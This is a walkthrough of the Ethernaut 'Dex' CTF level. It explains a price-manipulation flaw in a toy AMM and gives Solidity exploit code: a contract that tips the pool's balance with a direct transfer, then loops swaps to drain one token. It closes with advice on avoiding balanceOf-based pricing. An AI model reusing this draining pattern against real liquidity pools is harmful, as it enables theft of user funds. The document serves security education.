# Ethernaut Walkthrough: Dex
## Welcome to KweenBirb's 23rd installment of Ethernaut walkthroughs!

Ethernaut is a set of gamified Solidity challenges in the style of a CTF, where each level features a hackable smart contract that will inform you of various known security vulnerabilities on EVM blockchains.

This repo will walk you through a solution to Dex.sol, the 23rd challenge in the series. You can find the challenge itself and fully fleshed out solution in the .txt file in this directory and the .sol file in the src directory. Let's begin!

OpenZeppelin instructs us 'to hack the basic DEX contract below and steal the funds by price manipulation.` They later elaborate that the goal is to 'drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.'

Okay, wow! We're in the big leagues now huh? DeFi exploits on AMM liquidity pools! Let's get going, then.

## The price mechanism

Since Ethernaut hints that a 'bad' price reported by the smart contract is involved in the exploit, we begin by examining the price mechanism.

Price quotes for swaps are calculated by identifying the ratio of liquidity between the two tokens and then multiplying the ratio by the amount of token being sold. This is described by the getSwapPrice() function, where these steps are accomplished first by dividing the contract's balance of tokens to buy (parameter named 'to') by the contract's balance of tokens to sell (parameter named 'from'). That ratio is then applied to the supplied amount of tokens to sell to return the price quote.

```
function getSwapPrice(address from, address to, uint amount) public view returns (uint) {
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}
```

Here's a simple equation to illustrate:

```swapAmount = suppliedAmount * buyBalance/sellBalance```

## The swap() function mechanism

Great, now that we've identified how price is calculated, let's trace the execution of a swap() to see what we can glean:

```
function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

The swap function execution steps are as follows: 
1. limits parameters to only accept the two storage variables that store tokens for this pool;
2. checks to ensure msg.sender has enough 'from' tokens to perform swap using the provided uint amount
3. calls function to set swapAmount = suppliedAmount * newBalance/oldBalance
4. calls transferFrom on oldToken, transferring supplied amount to sell into this contract pool
5. calls approve on newToken, allowing this contract to spend swapAmount of desired token
6. calls transferFrom on newToken, transferring previously approved swapAmount to msg.sender, completing the (d)exchange

Knowing this, the easiest way to throw off the price recordkeeping would be to change the contract's balance of tokens for when it checks it in the getSwapPrice() function. Unfortunately for us, however, addLiquidity() is restricted by the onlyOwner modifier. But wait! That doesn't stop us from simply manually transferring tokens to the contract!

## Using a basic transfer to catalyze economic imbalance

We may not be able to call addLiquidity(), but using a regular ERC20 transfer() we can cause the calls to balanceOf(address(this)) in getSwapPrice() to return values the dex contract was not built to expect. The general process would look something like this:

```
    First, transfer() 10token1 to contract -> IERC20(token1).balanceOf(address(this)) == 110
        contract: 100 100 -> 110 100
        hacker:   10  10  -> 0   10
    swapAmount = 10 * 110 / 100  // 1.1 ratio means hacker can obtain 11 token1 in exchange for 10 token2
        contract: 110 100 -> 99 110
        hacker:   0   10  -> 11 0
    
    Second, swap again:
    swapAmount = 11 * 110 / 99  // == 12.2 so hacker can exchange 11 token1 for 12.2 token2
        contract: 99 110 -> 110 97.8
        hacker:   11 0   -> 0   12.2

    again:
    swapAmount = 12.2 * 110 / 97.8  // == 13.7 so hacker can exchange 12.2 token2 for 13.7 token1
        contract: 110 97.8 -> 96.3 110
        hacker:   0   12.2 -> 13.7 0

    again:
    swapAmount = 13.7 * 110 / 96.3  // == 15.6 so hacker can exchange 13.7 token1 for 15.6 token2
        contract: 96.3 110 -> 110 94.4
        hacker:   13.7 0   -> 0   15.6

    again:
    swapAmount = 15.6 * 110 / 94.4  // == 18.2
        contract: 110 94.4 -> 91.8 110
        hacker:  0   15.6  -> 18.2 0

    again:
    swapAmount = 18.2 * 110/ 91.8  // == 21.8
```

You get the point. By causing an initial imbalance of assets in the pool, we can bundle repeated swap calls to leverage the imbalance so that it expands until the entire balance of one side of the pool is drained. 

## Writing code to accomplish the hack

First we should set up our environment of imports and addresses needed to pull off the hack:

```
import "./Dex.sol";

contract Draino {
    address public token1;
    address public token2;
    address private hacker;
    Dex dex;

    constructor(address $your_ethernaut_instance_here) {
        dex = Dex($your_ethernaut_instance_here);
        token1 = dex.token1();
        token2 = dex.token2();
        hacker = msg.sender;
    }
}
```

With that framework in place, we can create SwappableToken instances on the addresses in storage and preemptively set max approvals from our address (hacker) to the malicious contract we're writing:

```
function drain() public {
    // approve this contract to spend both of user's initial 10tokens
    SwappableToken a = SwappableToken(token1);
    SwappableToken b = SwappableToken(token2);
    a.approve(hacker, address(this), (2**256 - 1));
    b.approve(hacker, address(this), (2**256 - 1));
}
```

Then we can commence the hack by transferring 10 token1 to the dex to cause a liquidity imbalance and transferring 10 token2 to the malicious contract we're writing so it can take the reins.

```
// send 10 token1 to dex to initialize unexpected contract liquidity imbalance
IERC20(token1).transferFrom(hacker, address(dex), 10);
// obtain 10token2 liquidity from hacker to start exploit
IERC20(token2).transferFrom(hacker, address(this), 10);
```

Since we'll want the contract to continually swap back and forth until one side of the liquidity pool reaches 0, we can use a while loop:

```
while (dex.balanceOf(token1, address(dex)) > 0 && dex.balanceOf(token2, address(dex)) > 0) {
    uint balance = dex.balanceOf(token1, address(this));

    // alternate swap in other direction
    if (balance == 0) { 
        balance = dex.balanceOf(token2, address(this));
          
        // set allowance for dex in from to msg.sender
        b.approve(address(this), address(dex), balance);

        // catch issue where swapAmount is set to 245, more than the dex pool holds!
        if (dex.getSwapPrice(token2, token1, balance) > 110) {
            balance = 34;
            dex.swap(token2, token1, balance);
        } else {
            dex.swap(token2, token1, balance);
        }
    } else {
        a.approve(address(dex), balance);

        // catch same swapAmount == 245 issue in reverse direction
        if (dex.getSwapPrice(token1, token2, balance) > 110) {
            balance = 34;
            dex.swap(token1, token2, balance);
        } else {
            dex.swap(token1, token2, balance);
        }
    }
}
```

As you can see we had to catch the issue where the penultimate swap pushes the swap amount to a high amount, 245, which exceeds the balance of the liquidity pool. That will cause the final swap to fail and revert the transaction, so we manually entered the correct amount to rectify the final swap and fully drain the pool.

## Takeaways

As you can see, it's recommended never to rely on balance readings performed on address(this). Whether done through the ERC20/721 balanceOf() method or Solidity's address(this).balance, this method can be rendered unreliable as the EVM is a permissionless environment where tokens can be added to an address unexpectedly. The classic example illustrating this issue is the selfdestruct() opcode that forcibly sends ether.

A simple fix is to implement decentralized oracle data feeds like those of Chainlink to replace ```balanceOf(address(this))``` calls! There are of course a few considerations when using oracle data sources for price and liquidity calculations but it's leagues better than the code used in this Ethernaut challenge ;)

Congratulations on your first Dex hack!

○•○ h00t h00t ○•○
